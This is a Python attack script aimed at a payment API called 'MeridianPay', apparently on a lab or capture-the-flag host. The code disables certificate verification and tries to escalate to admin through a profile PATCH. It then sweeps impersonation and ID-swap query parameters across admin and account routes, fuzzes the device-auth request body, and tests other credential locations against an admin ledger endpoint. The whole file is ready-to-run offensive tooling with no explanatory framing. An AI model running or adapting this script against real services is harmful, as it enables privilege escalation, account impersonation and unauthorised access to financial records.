import json, ssl, urllib.request, urllib.error, re
from concurrent.futures import ThreadPoolExecutor
BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"
def raw(p, m="GET", b=None, t=None, h=None):
    hh = {"Content-Type":"application/json","X-Meridian-Client":CL}
    if t: hh["Authorization"] = "Bearer " + t
    if h: hh.update(h)
    d = json.dumps(b).encode() if b is not None else None
    r = urllib.request.Request(BASE+p, data=d, method=m, headers=hh)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=12) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

_, t = raw("/api/v1/auth/device","POST",{"device_id":"params"}); T = json.loads(t)["token"]
raw("/api/v1/profile","PATCH",{"role":"admin"},T)

PARAMS = """user user_id userid uid member member_id id identity subject sub account account_id account_number
number owner owner_id customer customer_id client client_id tenant org organization corporate profile target
as impersonate act_as on_behalf_of sudo become switch_to override role tier view scope fields include expand
detail verbose full raw all debug pretty format type kind class category ledger promo receipt file path name key
token session device device_id q search limit offset page page_size index n"""
VALUES = ["1000","1002","1003","1","2","0","all","corporate","admin","system","1001","MP-0041-8827","9999","-1","*"]
ROUTES = ["/api/v1/admin/ledger", "/api/v1/accounts/me", "/api/v1/internal/promo", "/api/v1/promo/public", "/"]
base = {}
for r_ in ROUTES:
    base[r_] = raw(r_, t=T)[1]

print("== query param sweep ==", flush=True)
def work(args):
    r_, p, v = args
    c, b = raw(f"{r_}?{p}={v}", t=T)
    if b and b != base[r_]:
        return (r_, p, v, c, b[:260])
    return None
jobs = [(r_, p, v) for r_ in ROUTES for p in PARAMS.split() for v in (VALUES if r_ != "/" else ["all","1"])]
print("jobs", len(jobs), flush=True)
with ThreadPoolExecutor(max_workers=14) as ex:
    for res in ex.map(work, jobs):
        if res: print("DIFF", res, flush=True)

print("\n== auth/device body variations (with/without bearer) ==", flush=True)
bodies = [{"device_id":"d","user_id":1002},{"device_id":"d","member":1002},{"device_id":"d","sub":"1002"},
          {"device_id":"d","role":"admin"},{"device_id":"d","admin":True},{"device_id":"d","impersonate":"1002"},
          {"device_id":"d","token":T},{"device_id":"d","session_token":T},{"device_id":"d","attested":True},
          {"device_id":"d","client":"web"},{"device_id":"d","platform":"web"},{"device_id":"d","name":"X"},
          {"device_id":"and-00000000-0000-0000-0000-000000000000"},{"device_id":"d","user_id":"1002"},
          {"device_id":"d","account_number":"MP-0041-8827"},{"device_id":"d","tier":"corporate"}]
for b in bodies:
    c, x = raw("/api/v1/auth/device","POST",b,T)
    try:
        j = json.loads(x); ident = (j.get("user_id"), j.get("name"))
    except Exception:
        ident = x[:60]
    print(f"  {str(b)[:64]:66s} -> {c} {ident}")
print("\n== credential location alternatives ==", flush=True)
tests = {
 "cookie session_token": {"Cookie": "session_token=" + T},
 "cookie token": {"Cookie": "token=" + T},
 "X-Session-Token": {"X-Session-Token": T},
 "X-Meridian-Token": {"X-Meridian-Token": T},
 "X-Auth-Token": {"X-Auth-Token": T},
 "Authorization no-scheme": None,
}
for name, h in tests.items():
    if h is None:
        c, b = raw("/api/v1/admin/ledger", t=None, h={"Authorization": T})
    else:
        c, b = raw("/api/v1/admin/ledger", t=None, h=h)
    print(f"  {name:24s} -> {c} {b[:90].strip()}")
for q in ["access_token","token","bearer","session_token","jwt","t"]:
    c, b = raw(f"/api/v1/admin/ledger?{q}={T}")
    print(f"  ?{q:16s} -> {c} {b[:90].strip()}")
